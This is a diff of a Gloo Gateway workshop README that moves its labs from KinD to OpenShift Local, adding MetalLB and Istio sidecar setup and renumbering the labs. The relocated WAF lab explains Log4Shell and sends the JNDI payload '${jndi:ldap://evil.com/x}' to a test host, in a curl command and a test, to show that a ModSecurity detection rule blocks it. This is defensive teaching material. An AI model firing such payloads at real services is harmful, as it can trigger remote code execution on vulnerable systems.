@@ -13,25 +13,25 @@ source ./scripts/assert.sh
 
 ## Table of Contents
 * [Introduction](#introduction)
-* [Lab 1 - Deploy a KinD cluster](#lab-1---deploy-a-kind-cluster-)
-* [Lab 2 - Deploy Istio in Ambient mode](#lab-2---deploy-istio-in-ambient-mode-)
-* [Lab 3 - Deploy Keycloak](#lab-3---deploy-keycloak-)
-* [Lab 4 - Deploy Gloo Gateway](#lab-4---deploy-gloo-gateway-)
-* [Lab 5 - Deploy the httpbin demo app](#lab-5---deploy-the-httpbin-demo-app-)
-* [Lab 6 - Expose the httpbin application through the gateway](#lab-6---expose-the-httpbin-application-through-the-gateway-)
-* [Lab 7 - Delegate with control](#lab-7---delegate-with-control-)
-* [Lab 8 - Modify the requests and responses](#lab-8---modify-the-requests-and-responses-)
-* [Lab 9 - Split traffic between 2 backend services](#lab-9---split-traffic-between-2-backend-services-)
-* [Lab 10 - Securing the access with OAuth](#lab-10---securing-the-access-with-oauth-)
-* [Lab 11 - Use the transformation filter to manipulate headers](#lab-11---use-the-transformation-filter-to-manipulate-headers-)
-* [Lab 12 - Apply rate limiting to the Gateway](#lab-12---apply-rate-limiting-to-the-gateway-)
-* [Lab 13 - Use the Web Application Firewall filter](#lab-13---use-the-web-application-firewall-filter-)
+* [Lab 1 - Deploy an OpenShift Local cluster](#lab-1---deploy-an-openshift-local-cluster-)
+* [Lab 2 - Install MetalLB on OpenShift cluster](#lab-2---install-metallb-on-openshift-cluster-)
+* [Lab 3 - Deploy Istio in Sidecar mode](#lab-3---deploy-istio-in-sidecar-mode-)
+* [Lab 4 - Deploy Keycloak](#lab-4---deploy-keycloak-)
+* [Lab 5 - Deploy Gloo Gateway](#lab-5---deploy-gloo-gateway-)
+* [Lab 6 - Deploy the httpbin demo app](#lab-6---deploy-the-httpbin-demo-app-)
+* [Lab 7 - Expose the httpbin application through the gateway](#lab-7---expose-the-httpbin-application-through-the-gateway-)
+* [Lab 8 - Delegate with control](#lab-8---delegate-with-control-)
+* [Lab 9 - Modify the requests and responses](#lab-9---modify-the-requests-and-responses-)
+* [Lab 10 - Split traffic between 2 backend services](#lab-10---split-traffic-between-2-backend-services-)
+* [Lab 11 - Securing the access with OAuth](#lab-11---securing-the-access-with-oauth-)
+* [Lab 12 - Use the transformation filter to manipulate headers](#lab-12---use-the-transformation-filter-to-manipulate-headers-)
+* [Lab 13 - Apply rate limiting to the Gateway](#lab-13---apply-rate-limiting-to-the-gateway-)
 * [Lab 14 - Use the JWT filter to validate JWT and create headers from claims](#lab-14---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-)
-* [Lab 15 - Validate and authorize client certificates](#lab-15---validate-and-authorize-client-certificates-)
-* [Lab 16 - Use the `cache-control` response header to cache responses](#lab-16---use-the-`cache-control`-response-header-to-cache-responses-)
-* [Lab 17 - Deploy Argo Rollouts](#lab-17---deploy-argo-rollouts-)
-* [Lab 18 - Roll out a new app version using Argo Rollouts](#lab-18---roll-out-a-new-app-version-using-argo-rollouts-)
-* [Lab 19 - Deploy OpenTelemetry Collector](#lab-19---deploy-opentelemetry-collector-)
+* [Lab 15 - Use the Web Application Firewall filter](#lab-15---use-the-web-application-firewall-filter-)
+* [Lab 16 - Validate and authorize client certificates](#lab-16---validate-and-authorize-client-certificates-)
+* [Lab 17 - Use the `cache-control` response header to cache responses](#lab-17---use-the-`cache-control`-response-header-to-cache-responses-)
+* [Lab 18 - Deploy Argo Rollouts](#lab-18---deploy-argo-rollouts-)
+* [Lab 19 - Roll out a new app version using Argo Rollouts](#lab-19---roll-out-a-new-app-version-using-argo-rollouts-)
 * [Lab 20 - Deploy the Bookinfo sample application](#lab-20---deploy-the-bookinfo-sample-application-)
 * [Lab 21 - Expose the productpage API securely](#lab-21---expose-the-productpage-api-securely-)
 * [Lab 22 - Expose an external API and stitch it with the productpage API](#lab-22---expose-an-external-api-and-stitch-it-with-the-productpage-api-)
@@ -88,48 +88,86 @@ You can find more information about Gloo Gateway in the official documentation: 
 
 
 
-## Lab 1 - Deploy a KinD cluster <a name="lab-1---deploy-a-kind-cluster-"></a>
+## Lab 1 - Deploy an OpenShift Local cluster <a name="lab-1---deploy-an-openshift-local-cluster-"></a>
+
+Installation steps for OpenShift Local Cluster (formerly CodeReady Containers) on your local machine.
+
+1. Obtain an Offline Token
+
+* Visit https://console.redhat.com/openshift/token to generate an offline token.
+* You will be asked to log in with your Red Hat credentials.
+* Copy the provided token as you'll need it shortly.
+* And export it as an environment variable:
+
+```
+export REDHAT_OFFLINE_TOKEN="<your_offline_token>"
+```
+
+2. Install and configure crc (CodeReady Containers)
+
+The crc tool is the command-line interface for managing your OpenShift Local cluster.
+
+```
+wget https://mirror.openshift.com/pub/openshift-v4/clients/crc/latest/crc-linux-amd64.tar.xz
+tar -xf crc-linux-amd64.tar.xz
+sudo mv crc-linux-*/crc /usr/local/bin/
+```
+
+Configure `crc` to use more resources, as for this workshop we need at least 16GB of memory and 50GB of disk space:
+
+```
+crc config set skip-check-daemon-systemd-sockets true
+crc config set skip-check-daemon-systemd-unit true
+crc config set skip-check-systemd-networkd-running true
+crc config set skip-check-systemd-resolved-running true
+crc config set disk-size 50
+crc config set memory 18432
+crc config set cpus 8
+crc setup
+```
+
+**Rerun Setup After Logout/Login**
+
+```
+crc setup
+```
+
+The setup process will print:
+```
+Your system is correctly setup for using CRC. Use 'crc start' to start the instance.
+```
+
+3. Get the Pull Secret and Start the Cluster
+```
+export BEARER=$(curl \
+  --silent \
+  --data-urlencode "grant_type=refresh_token" \
+  --data-urlencode "client_id=cloud-services" \
+  --data-urlencode "refresh_token=${REDHAT_OFFLINE_TOKEN}" \
+  https://sso.redhat.com/auth/realms/redhat-external/protocol/openid-connect/token | \
+  jq -r .access_token)
 
 
-Clone this repository and go to the directory where this `README.md` file is.
+export PULL_SECRET=$(curl -X 'POST' \
+  'https://api.openshift.com/api/accounts_mgmt/v1/access_token' \
+  -H 'accept: application/json' \
+  -H "Authorization: Bearer $BEARER")
 
-Set the context environment variable:
+
+echo $PULL_SECRET > pull-secret.txt
+
+# Start the cluster
+crc start -p pull-secret.txt
+```
+
+
+That's it, now just make sure to update the context name to `cluster1`:
 
 ```bash
-export CLUSTER1=cluster1
+kubectl config use-context crc-admin
+kubectl config rename-context crc-admin cluster1
 ```
 
-Run the following commands to deploy a Kubernetes cluster using [Kind](https://kind.sigs.k8s.io/):
-
-```bash
-./scripts/deploy-multi.sh 1 cluster1
-```
-
-Then run the following commands to wait for all the Pods to be ready:
-
-```bash
-./scripts/check.sh cluster1
-```
-
-**Note:** If you run the `check.sh` script immediately after the `deploy.sh` script, you may see a jsonpath error. If that happens, simply wait a few seconds and try again.
-
-Once the `check.sh` script completes, when you execute the `kubectl get pods -A` command, you should see the following:
-
-```,nocopy
-NAMESPACE            NAME                                          READY   STATUS    RESTARTS   AGE
-kube-system          calico-kube-controllers-59d85c5c84-sbk4k      1/1     Running   0          4h26m
-kube-system          calico-node-przxs                             1/1     Running   0          4h26m
-kube-system          coredns-6955765f44-ln8f5                      1/1     Running   0          4h26m
-kube-system          coredns-6955765f44-s7xxx                      1/1     Running   0          4h26m
-kube-system          etcd-cluster1-control-plane                   1/1     Running   0          4h27m
-kube-system          kube-apiserver-cluster1-control-plane         1/1     Running   0          4h27m
-kube-system          kube-controller-manager-cluster1-control-plane1/1     Running   0          4h27m
-kube-system          kube-proxy-ksvzw                              1/1     Running   0          4h26m
-kube-system          kube-scheduler-cluster1-control-plane         1/1     Running   0          4h27m
-local-path-storage   local-path-provisioner-58f6947c7-lfmdx        1/1     Running   0          4h26m
-metallb-system       controller-5c9894b5cd-cn9x2                   1/1     Running   0          4h26m
-metallb-system       speaker-d7jkp                                 1/1     Running   0          4h26m
-```
 <!--bash
 cat <<'EOF' > ./test.js
 const helpers = require('./tests/chai-exec');
@@ -141,14 +179,125 @@ describe("Clusters are healthy", () => {
     });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-kind-cluster/tests/cluster-healthy.test.js.liquid"
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-openshift-local/tests/cluster-healthy.test.js.liquid"
 timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail || { DEBUG_MODE=true mocha ./test.js --timeout 80000; exit 1; }
 -->
 
 
 
-## Lab 2 - Deploy Istio in Ambient mode <a name="lab-2---deploy-istio-in-ambient-mode-"></a>
+## Lab 2 - Install MetalLB on OpenShift cluster <a name="lab-2---install-metallb-on-openshift-cluster-"></a>
 
+MetalLB is required in a local OpenShift environment to assign external IP addresses to your services. Let's quickly get it set up:
+
+Install MetalLB Operator:
+```bash
+cat << EOF | kubectl apply -f -
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: metallb-system
+EOF
+
+cat << EOF | kubectl apply -f -
+apiVersion: operators.coreos.com/v1
+kind: OperatorGroup
+metadata:
+  name: metallb-operator
+  namespace: metallb-system
+EOF
+
+cat << EOF | kubectl apply -f -
+apiVersion: operators.coreos.com/v1alpha1
+kind: Subscription
+metadata:
+  name: metallb-operator-sub
+  namespace: metallb-system
+spec:
+  channel: stable
+  name: metallb-operator
+  source: redhat-operators
+  sourceNamespace: openshift-marketplace
+EOF
+
+
+echo "Waiting for MetalLB operator installation... This can take up to 5 minutes"
+until kubectl get csv -n metallb-system | grep "Succeeded"; do
+  echo -n "."
+  sleep 5
+done
+```
+
+Next let's create an instance of MetalLB.
+```bash
+cat << EOF | kubectl apply -f -
+apiVersion: metallb.io/v1beta1
+kind: MetalLB
+metadata:
+  name: metallb
+  namespace: metallb-system
+EOF
+
+until kubectl get deployment -n metallb-system controller -o jsonpath='{.status.conditions[?(@.type=="Available")].status}' | grep -q "True"; do
+  echo "Waiting for deployment controller to be ready..."
+  sleep 5
+done
+echo "Deployment controller is ready."
+
+until [[ $(kubectl get daemonset -n metallb-system speaker -o jsonpath='{.status.numberReady}') == $(kubectl get daemonset -n metallb-system speaker -o jsonpath='{.status.desiredNumberScheduled}') ]]; do
+  echo "Waiting for daemonset speaker to be ready..."
+  sleep 5
+done
+echo "Daemonset speaker is ready."
+```
+
+Configure the Address Pool:
+```bash
+cat <<EOF | kubectl apply -f -
+apiVersion: metallb.io/v1beta1
+kind: L2Advertisement
+metadata:
+  name: config
+  namespace: metallb-system
+---
+apiVersion: metallb.io/v1beta1
+kind: IPAddressPool
+metadata:
+  name: config
+  namespace: metallb-system
+spec:
+  addresses:
+  - 192.168.130.60-192.168.130.80
+EOF
+```
+
+With these steps, you'll have MetalLB up and running, allowing you to test your services with external IPs in your OpenShift Local cluster.
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpers = require('./tests/chai-exec');
+const chai = require("chai");
+const expect = chai.expect;
+
+describe("MetalLB", () => {
+    before(() => {
+        helpers.genericCommand({ command: "kubectl create service loadbalancer dummy-service --tcp=8080:8080" })
+    });
+
+    it("should assign external IPs to services of type load balancer", () => {
+        const externalIP = helpers.getOutputForCommand({ command: "kubectl get service dummy-service -o jsonpath='{.status.loadBalancer.ingress[0].ip}'"})
+        expect(externalIP).to.not.be.empty;
+    });
+});
+
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-metallb-on-openshift/tests/externalips-assigned.test.js.liquid"
+timeout --signal=INT 2m mocha ./test.js --timeout 1000 --retries=120 --bail || { DEBUG_MODE=true mocha ./test.js --timeout 80000; exit 1; }
+-->
+
+
+
+
+## Lab 3 - Deploy Istio in Sidecar mode <a name="lab-3---deploy-istio-in-sidecar-mode-"></a>
 
 Download the Istio release:
 
@@ -156,52 +305,16 @@ Download the Istio release:
 curl -L https://istio.io/downloadIstio | sh -
 
 if [ -d "istio-"*/ ]; then
-    cd istio-*/
-    export PATH=$PWD/bin:$PATH
-    cd ..
+  cd istio-*/
+  export PATH=$PWD/bin:$PATH
+  cd ..
 fi
 ```
 
-Install Istio in Ambient mode:
+Install Istio in Sidecar mode:
 
 ```bash
-helm upgrade --install istio-base \
-  oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/base \
-  -n istio-system --create-namespace \
-  --version 1.23.2-solo \
-  --kube-context ${CLUSTER1} \
-  --wait
-
-helm upgrade --install istio-cni \
-  oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/cni \
-  -n istio-system \
-  --version 1.23.2-solo \
-  --set profile=ambient \
-  --set global.hub=us-docker.pkg.dev/gloo-mesh/istio-<enterprise_istio_repo> \
-  --set global.tag=1.23.2-solo \
-  --kube-context ${CLUSTER1} \
-  --wait
-
-helm upgrade --install istiod \
-  oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/istiod \
-  -n istio-system \
-  --version 1.23.2-solo \
-  --set profile=ambient \
-  --set global.hub=us-docker.pkg.dev/gloo-mesh/istio-<enterprise_istio_repo> \
-  --set global.tag=1.23.2-solo \
-  --kube-context ${CLUSTER1} \
-  --wait
-
-helm upgrade --install ztunnel \
-  oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/ztunnel \
-  -n istio-system \
-  --version 1.23.2-solo \
-  --set profile=ambient \
-  --set hub=us-docker.pkg.dev/gloo-mesh/istio-<enterprise_istio_repo> \
-  --set tag=1.23.2-solo \
-  --set env.L7_ENABLED="true" \
-  --kube-context ${CLUSTER1} \
-  --wait
+istioctl --context ${CLUSTER1} install --set profile=openshift -y
 ```
 
 Run the following command to check the Istio Pods are running:
@@ -213,10 +326,9 @@ kubectl --context ${CLUSTER1} -n istio-system get pods
 Here is the expected output:
 
 ```,nocopy
-NAME                      READY   STATUS    RESTARTS   AGE
-istio-cni-node-75ds2      1/1     Running   0          86s
-istiod-7758df6879-pcvjt   1/1     Running   0          45s
-ztunnel-zgf7b             1/1     Running   0          13s
+NAME                                    READY   STATUS    RESTARTS   AGE
+istio-ingressgateway-7ffb6cd88d-t7klt   1/1     Running   0          8s
+istiod-69d887df6d-gxf6w                 1/1     Running   0          14s
 ```
 
 <!--bash
@@ -225,23 +337,19 @@ const helpers = require('./tests/chai-exec');
 
 describe("Istio", () => {
   let cluster = process.env.CLUSTER1
-  let deployments = ["istiod"];
+  let deployments = ["istiod", "istio-ingressgateway"];
   deployments.forEach(deploy => {
     it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "istio-system", k8sObj: deploy }));
   });
-  let DaemonSets = ["istio-cni-node", "ztunnel"];
-  DaemonSets.forEach(DaemonSet => {
-    it(DaemonSet + ' pods are ready in ' + cluster, () => helpers.checkDaemonSet({ context: cluster, namespace: "istio-system", k8sObj: DaemonSet }));
-  });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-istio-ambient/tests/check-istio.test.js.liquid"
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-istio-sidecar/tests/check-istio.test.js.liquid"
 timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail || { DEBUG_MODE=true mocha ./test.js --timeout 80000; exit 1; }
 -->
 
 
 
-## Lab 3 - Deploy Keycloak <a name="lab-3---deploy-keycloak-"></a>
+## Lab 4 - Deploy Keycloak <a name="lab-4---deploy-keycloak-"></a>
 
 In many use cases, you need to restrict the access to your applications to authenticated users.
 
@@ -255,7 +363,8 @@ But, first of all, we're going to deploy Keycloak to persist the data if Keycloa
 
 ```bash
 kubectl --context ${CLUSTER1} create namespace gloo-system
-kubectl --context ${CLUSTER1} label namespace gloo-system istio.io/dataplane-mode=ambient
+oc adm policy add-scc-to-user anyuid -z postgres -n gloo-system
+
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: v1
 kind: ServiceAccount
@@ -331,12 +440,6 @@ spec:
   ports:
     - port: 5432
 EOF
-```
-Let's create the `keycloak` namespace and label it to be part of the mesh:
-
-```bash
-kubectl --context ${CLUSTER1} create namespace keycloak
-kubectl --context ${CLUSTER1} label namespace keycloak istio.io/dataplane-mode=ambient
 ```
 
 Wait while Postgres finishes rolling out:
@@ -848,7 +951,7 @@ timeout 300 bash -c 'while [[ "$(curl -m 2 -s -o /dev/null -w ''%{http_code}'' $
 
 
 
-## Lab 4 - Deploy Gloo Gateway <a name="lab-4---deploy-gloo-gateway-"></a>
+## Lab 5 - Deploy Gloo Gateway <a name="lab-5---deploy-gloo-gateway-"></a>
 
 You can deploy Gloo Gateway with the `glooctl` CLI or declaratively using Helm.
 
@@ -858,12 +961,6 @@ Install the Kubernetes Gateway API CRDs as they do not come installed by default
 
 ```bash
 kubectl --context $CLUSTER1 apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.1.0/standard-install.yaml
-```
-Let's create the `gloo-system` namespace and label it to be part of the mesh:
-
-```bash
-kubectl --context $CLUSTER1 create namespace gloo-system
-kubectl --context $CLUSTER1 label namespace gloo-system istio.io/dataplane-mode=ambient
 ```
 
 
@@ -919,9 +1016,16 @@ gateway-portal-web-server:
 settings:
   disableKubernetesDestinations: true
 global:
+  securitySettings:
+    floatingUserId: true
   extensions:
     caching:
       enabled: true
+  istioSDS:
+    enabled: true
+  istioIntegration:
+    enabled: true
+    enableAutoMtls: true
 EOF
 ```
 
@@ -967,7 +1071,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail || 
 
 
 
-## Lab 5 - Deploy the httpbin demo app <a name="lab-5---deploy-the-httpbin-demo-app-"></a>
+## Lab 6 - Deploy the httpbin demo app <a name="lab-6---deploy-the-httpbin-demo-app-"></a>
 
 We're going to deploy the httpbin application to demonstrate several features of Gloo Gateway.
 
@@ -977,8 +1081,7 @@ Run the following commands to deploy the httpbin app twice (`httpbin1` and `http
 
 ```bash
 kubectl --context ${CLUSTER1} create ns httpbin
-kubectl --context ${CLUSTER1} label namespace httpbin istio.io/dataplane-mode=ambient
-kubectl --context ${CLUSTER1} label namespace httpbin istio-injection=disabled
+kubectl --context ${CLUSTER1} label namespace httpbin istio-injection=enabled
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: v1
 kind: ServiceAccount
@@ -1183,7 +1286,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail || 
 
 
 
-## Lab 6 - Expose the httpbin application through the gateway <a name="lab-6---expose-the-httpbin-application-through-the-gateway-"></a>
+## Lab 7 - Expose the httpbin application through the gateway <a name="lab-7---expose-the-httpbin-application-through-the-gateway-"></a>
 
 
 
@@ -1550,7 +1653,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail || 
 
 
 
-## Lab 7 - Delegate with control <a name="lab-7---delegate-with-control-"></a>
+## Lab 8 - Delegate with control <a name="lab-8---delegate-with-control-"></a>
 
 The team in charge of the gateway can create a parent `HTTPRoute` to delegate the routing of a domain or a path prefix (for example) to an application team.
 
@@ -1988,7 +2091,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail || 
 
 
 
-## Lab 8 - Modify the requests and responses <a name="lab-8---modify-the-requests-and-responses-"></a>
+## Lab 9 - Modify the requests and responses <a name="lab-9---modify-the-requests-and-responses-"></a>
 
 The Kubernetes Gateway API provides different options to add/update/remove request and response headers.
 
@@ -2466,7 +2569,7 @@ kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
 
 
 
-## Lab 9 - Split traffic between 2 backend services <a name="lab-9---split-traffic-between-2-backend-services-"></a>
+## Lab 10 - Split traffic between 2 backend services <a name="lab-10---split-traffic-between-2-backend-services-"></a>
 
 You can split traffic between different backends, with different weights.
 
@@ -2539,7 +2642,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail || 
 
 
 
-## Lab 10 - Securing the access with OAuth <a name="lab-10---securing-the-access-with-oauth-"></a>
+## Lab 11 - Securing the access with OAuth <a name="lab-11---securing-the-access-with-oauth-"></a>
 
 In this step, we're going to secure the access to the `httpbin` service using OAuth.
 
@@ -2784,7 +2887,7 @@ If you open the browser in incognito and login using the username `user2` and th
 
 
 
-## Lab 11 - Use the transformation filter to manipulate headers <a name="lab-11---use-the-transformation-filter-to-manipulate-headers-"></a>
+## Lab 12 - Use the transformation filter to manipulate headers <a name="lab-12---use-the-transformation-filter-to-manipulate-headers-"></a>
 
 
 In this step, we're going to use a regular expression to extract a part of an existing header and to create a new one:
@@ -2838,7 +2941,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail || 
 
 
 
-## Lab 12 - Apply rate limiting to the Gateway <a name="lab-12---apply-rate-limiting-to-the-gateway-"></a>
+## Lab 13 - Apply rate limiting to the Gateway <a name="lab-13---apply-rate-limiting-to-the-gateway-"></a>
 
 In this step, we're going to apply rate limiting to the Gateway to only allow 3 requests per minute for the users of the `solo.io` organization.
 
@@ -2946,91 +3049,6 @@ Let's delete the `RouteOption` object:
 ```bash
 kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
 ```
-
-
-
-## Lab 13 - Use the Web Application Firewall filter <a name="lab-13---use-the-web-application-firewall-filter-"></a>
-
-A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
-
-Gloo Gateway includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections.
-
-An example of how using Gloo Gateway we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
-
-The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit.
-
-Using the Web Application Firewall capabilities you can reject requests containing such headers.
-
-Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
-
-You need to create the following `RouteOption`:
-
-```bash
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: gateway.solo.io/v1
-kind: RouteOption
-metadata:
-  name: waf
-  namespace: gloo-system
-spec:
-  targetRefs:
-  - group: gateway.networking.k8s.io
-    kind: HTTPRoute
-    name: httpbin
-  options:
-    waf:
-      customInterventionMessage: 'Log4Shell malicious payload'
-      ruleSets:
-      - ruleStr: |
-          SecRuleEngine On
-          SecRequestBodyAccess On
-          SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
-            "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://"
-            "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
-EOF
-```
-
-As you can see, this `RouteOption` targets the parent `HTTPRoute`. That way, the WAF rule is applied to all the traffic targetting the `httpbin` application.
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("WAF is working properly", function() {
-  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-Agent', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
-});
-EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail || { DEBUG_MODE=true mocha ./test.js --timeout 80000; exit 1; }
--->
-
-Run the following command to simulate an attack:
-
-```bash
-curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://httpbin.example.com/get" -i
-```
-
-The request should be rejected:
-
-```http,nocopy
-HTTP/2 403 
-content-length: 27
-content-type: text/plain
-date: Tue, 05 Apr 2022 10:20:06 GMT
-server: istio-envoy
-
-Log4Shell malicious payload
-```
-
-Let's delete the `RouteOption` we've created:
-
-```bash
-kubectl delete --context ${CLUSTER1} -n gloo-system routeoption waf
-```
-
 
 
 
@@ -3272,7 +3290,92 @@ kubectl --context ${CLUSTER1} -n gloo-system delete virtualhostoption jwt
 
 
 
-## Lab 15 - Validate and authorize client certificates <a name="lab-15---validate-and-authorize-client-certificates-"></a>
+## Lab 15 - Use the Web Application Firewall filter <a name="lab-15---use-the-web-application-firewall-filter-"></a>
+
+A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
+
+Gloo Gateway includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections.
+
+An example of how using Gloo Gateway we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
+
+The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit.
+
+Using the Web Application Firewall capabilities you can reject requests containing such headers.
+
+Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
+
+You need to create the following `RouteOption`:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.solo.io/v1
+kind: RouteOption
+metadata:
+  name: waf
+  namespace: gloo-system
+spec:
+  targetRefs:
+  - group: gateway.networking.k8s.io
+    kind: HTTPRoute
+    name: httpbin
+  options:
+    waf:
+      customInterventionMessage: 'Log4Shell malicious payload'
+      ruleSets:
+      - ruleStr: |
+          SecRuleEngine On
+          SecRequestBodyAccess On
+          SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
+            "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://"
+            "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
+EOF
+```
+
+As you can see, this `RouteOption` targets the parent `HTTPRoute`. That way, the WAF rule is applied to all the traffic targetting the `httpbin` application.
+
+<!--bash
+cat <<'EOF' > ./test.js
+const chaiExec = require("@jsdevtools/chai-exec");
+const helpersHttp = require('./tests/chai-http');
+var chai = require('chai');
+var expect = chai.expect;
+
+describe("WAF is working properly", function() {
+  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-Agent', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail || { DEBUG_MODE=true mocha ./test.js --timeout 80000; exit 1; }
+-->
+
+Run the following command to simulate an attack:
+
+```bash
+curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://httpbin.example.com/get" -i
+```
+
+The request should be rejected:
+
+```http,nocopy
+HTTP/2 403 
+content-length: 27
+content-type: text/plain
+date: Tue, 05 Apr 2022 10:20:06 GMT
+server: istio-envoy
+
+Log4Shell malicious payload
+```
+
+Let's delete the `RouteOption` we've created:
+
+```bash
+kubectl delete --context ${CLUSTER1} -n gloo-system routeoption waf
+```
+
+
+
+
+## Lab 16 - Validate and authorize client certificates <a name="lab-16---validate-and-authorize-client-certificates-"></a>
 
 In this step, we're going to secure the access to the httpbin service using mutual TLS (mTLS), and apply further authorization based on information in the client certificate.
 
@@ -3691,7 +3794,7 @@ kubectl --context ${CLUSTER1} -n httpbin delete RouteOption routeoption
 
 
 
-## Lab 16 - Use the `cache-control` response header to cache responses <a name="lab-16---use-the-`cache-control`-response-header-to-cache-responses-"></a>
+## Lab 17 - Use the `cache-control` response header to cache responses <a name="lab-17---use-the-`cache-control`-response-header-to-cache-responses-"></a>
 
 An HTTP or HTTPS listener on your gateway can be configured to cache responses for upstream services.
 When the listener routes a request to an upstream service, the response from the upstream is automatically cached by the caching server if it contains a `cache-control` response header.
@@ -3712,13 +3815,6 @@ caching-service   1/1     1            1           166m
 
 This service is responsible for creating the cached responses in the backing Redis datastore when an eligible response is being processed.
 
-<!--bash
-LAST_LDS_UPDATE_COUNT=$(kubectl --context ${CLUSTER1} -n gloo-system debug \
-  $(kubectl --context ${CLUSTER1} -n gloo-system get po -l gateway.networking.k8s.io/gateway-name=http -oname) \
-  -qi --image=curlimages/curl \
-  -- curl -sS 'http://localhost:19000/stats?format=json&filter=listener_manager.lds.update_success' | \
-  jq '.stats[].value')
--->
 
 To work around bug #6709, we need to remove some global caching configuration from Gloo Gateway's default settings:
 
@@ -3728,23 +3824,6 @@ kubectl --context ${CLUSTER1} patch settings default -n gloo-system --type json 
 
 sleep 5
 ```
-<!--bash
-kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy gloo
-
-echo -n Waiting for LDS sync...
-timeout -v 5m bash -c "while true; do
-  sleep 1
-  echo -n .
-  if [[ \$(kubectl --context ${CLUSTER1} -n gloo-system debug \
-      $(kubectl --context ${CLUSTER1} -n gloo-system get po -l gateway.networking.k8s.io/gateway-name=http -oname) \
-      -qi --image=curlimages/curl \
